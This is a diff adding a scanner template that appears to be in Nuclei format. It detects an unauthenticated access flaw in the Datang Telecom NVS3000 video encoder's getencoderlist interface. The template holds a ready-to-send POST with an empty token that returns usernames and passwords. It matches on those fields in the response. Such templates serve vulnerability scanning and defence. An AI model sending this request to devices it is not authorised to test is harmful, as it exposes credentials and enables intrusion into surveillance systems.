@@ -1,0 +1,29 @@
+id: datang-dianxin-nvs3000-getencoderlist-unauthorized-access
+info:
+  name: "大唐电信NVS3000 getencoderlist接口未授权访问漏洞"
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 大唐电信,NVS3000
+http:
+  - raw:
+      - |
+        POST /nvsthird/getencoderlist HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"token":"","fromindex":0,"toindex":-1}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"username\":"
+          - "\"errormsg\":\"OK\""
+          - "\"password\":"
+      - type: word
+        part: header
+        words:
+          - "application/json"
